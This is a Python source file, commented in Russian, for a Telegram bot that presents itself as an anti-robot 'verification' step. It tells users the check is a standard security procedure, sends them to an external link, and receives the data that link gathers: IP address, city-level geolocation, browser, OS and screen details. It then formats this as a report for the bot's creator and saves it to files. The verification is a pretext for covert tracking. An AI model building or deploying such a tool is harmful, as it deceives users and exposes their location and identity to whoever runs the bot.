"""
Telegram бот для верификации пользователей
Основной модуль системы верификации
"""

import logging
import asyncio
import secrets
from datetime import datetime
from typing import Dict, Optional

from telegram import (
    Update, 
    InlineKeyboardButton, 
    InlineKeyboardMarkup, 
    WebAppInfo
)
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    ContextTypes, 
    MessageHandler, 
    filters
)

from config import (
    BOT_TOKEN,
    CREATOR_CHAT_ID,
    WEBSITE_BASE_URL,
    DATABASE_PATH
)
from database import (
    init_database,
    save_verification_token,
    get_user_by_token,
    update_user_data,
    save_collected_data
)

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('bot/verification_bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class VerificationBot:
    def __init__(self):
        self.app = None
        self.verification_tokens: Dict[str, dict] = {}
        
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка команды /start"""
        user = update.effective_user
        logger.info(f"Пользователь {user.id} начал взаимодействие")
        
        # Генерация уникального токена верификации
        token = secrets.token_urlsafe(32)
        verification_url = f"{WEBSITE_BASE_URL}/verify?token={token}&user_id={user.id}"
        
        # Сохранение в базу данных
        user_data = {
            'telegram_id': user.id,
            'username': user.username,
            'first_name': user.first_name,
            'last_name': user.last_name,
            'token': token,
            'created_at': datetime.now().isoformat(),
            'status': 'pending'
        }
        
        save_verification_token(user_data)
        
        # Создание инлайн-кнопки для верификации
        keyboard = [
            [
                InlineKeyboardButton(
                    "🔐 Пройти верификацию",
                    web_app=WebAppInfo(url=verification_url)
                )
            ],
            [
                InlineKeyboardButton(
                    "🌐 Открыть в браузере",
                    url=verification_url
                )
            ]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"👋 Добро пожаловать, {user.first_name}!\n\n"
            "Для использования всех функций бота необходимо подтвердить, "
            "что вы не робот. Это стандартная процедура безопасности.\n\n"
            "Нажмите кнопку ниже, чтобы пройти быструю проверку.",
            reply_markup=reply_markup,
            parse_mode='HTML'
        )
    
    async def handle_verification_complete(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Обработка завершения верификации"""
        query = update.callback_query
        await query.answer()
        
        token = query.data.split(':')[1]
        user_data = get_user_by_token(token)
        
        if user_data and user_data.get('verified'):
            await query.edit_message_text(
                "✅ Верификация успешно пройдена!\n"
                "Теперь вам доступны все функции бота."
            )
        else:
            await query.edit_message_text(
                "❌ Верификация не пройдена. Пожалуйста, попробуйте снова."
            )
    
    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Проверка статуса верификации"""
        user = update.effective_user
        user_data = get_user_by_telegram_id(user.id)
        
        if user_data and user_data.get('verified'):
            status_text = "✅ Верифицирован"
        else:
            status_text = "❌ Не верифицирован"
        
        await update.message.reply_text(
            f"Статус верификации: {status_text}"
        )
    
    async def receive_collected_data(self, data: dict):
        """Получение собранных данных с веб-сервера"""
        try:
            token = data.get('token')
            collected_data = data.get('collected_data', {})
            
            # Сохранение данных в БД
            save_collected_data(token, collected_data)
            
            # Получение информации о пользователе
            user_data = get_user_by_token(token)
            
            if user_data:
                # Отправка данных создателю
                await self.send_data_to_creator(user_data, collected_data)
                
                # Обновление статуса пользователя
                update_user_data(token, {'verified': True})
                
                logger.info(f"Данные получены для пользователя {user_data['telegram_id']}")
            
            return True
        except Exception as e:
            logger.error(f"Ошибка при получении данных: {e}")
            return False
    
    async def send_data_to_creator(self, user_data: dict, collected_data: dict):
        """Отправка собранных данных создателю бота"""
        message = self.format_data_message(user_data, collected_data)
        
        # Здесь должна быть реализация отправки сообщения
        # Например, через Telegram API или сохранение в файл
        with open(f"bot/data/{user_data['telegram_id']}_{datetime.now().timestamp()}.json", 'w') as f:
            import json
            json.dump({
                'user_data': user_data,
                'collected_data': collected_data,
                'received_at': datetime.now().isoformat()
            }, f, indent=2, ensure_ascii=False)
        
        logger.info(f"Данные сохранены для {user_data['telegram_id']}")
    
    def format_data_message(self, user_data: dict, collected_data: dict) -> str:
        """Форматирование сообщения с данными"""
        message = "📊 НОВЫЕ ДАННЫЕ ВЕРИФИКАЦИИ\n\n"
        
        message += "👤 ДАННЫЕ TELEGRAM:\n"
        message += f"ID: {user_data.get('telegram_id')}\n"
        message += f"Username: @{user_data.get('username', 'N/A')}\n"
        message += f"Имя: {user_data.get('first_name', 'N/A')}\n"
        message += f"Фамилия: {user_data.get('last_name', 'N/A')}\n"
        message += f"Время запроса: {user_data.get('created_at')}\n\n"
        
        message += "🌐 СБОРНЫЕ ДАННЫЕ:\n"
        
        # IP и местоположение
        if collected_data.get('ip'):
            message += f"IP адрес: {collected_data['ip']}\n"
        
        if collected_data.get('geo'):
            geo = collected_data['geo']
            message += f"Страна: {geo.get('country', 'N/A')}\n"
            message += f"Город: {geo.get('city', 'N/A')}\n"
            message += f"Регион: {geo.get('region', 'N/A')}\n"
            message += f"Часовой пояс: {geo.get('timezone', 'N/A')}\n"
        
        # Браузер и устройство
        if collected_data.get('browser'):
            browser = collected_data['browser']
            message += f"Браузер: {browser.get('name', 'N/A')} {browser.get('version', '')}\n"
            message += f"ОС: {browser.get('os', 'N/A')}\n"
            message += f"Платформа: {browser.get('platform', 'N/A')}\n"
            message += f"Мобильное: {browser.get('is_mobile', 'N/A')}\n"
        
        # Экран
        if collected_data.get('screen'):
            screen = collected_data['screen']
            message += f"Разрешение: {screen.get('width', 'N/A')}x{screen.get('height', 'N/A')}\n"
            message += f"Глубина цвета: {screen.get('color_depth', 'N/A')}\n"
        
        # Время
        if collected_data.get('time'):
            message += f"Часовой пояс: {collected_data['time'].get('timezone', 'N/A')}\n"
        
        # Дополнительные данные
        if collected_data.get('additional'):
            message += f"\n📱 ДОПОЛНИТЕЛЬНО:\n"
            for key, value in collected_data['additional'].items():
                message += f"{key}: {value}\n"
        
        message += f"\n🕒 Время сбора: {collected_data.get('timestamp', 'N/A')}"
        
        return message
    
    def run(self):
        """Запуск бота"""
        # Инициализация базы данных
        init_database()
        
        # Создание приложения
        self.app = Application.builder().token(BOT_TOKEN).build()
        
        # Регистрация обработчиков
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("status", self.status_command))
        
        # Запуск бота
        logger.info("Бот верификации запущен...")
        self.app.run_polling(allowed_updates=Update.ALL_TYPES)

def main():
    """Точка входа для бота"""
    bot = VerificationBot()
    bot.run()

if __name__ == '__main__':
    main()
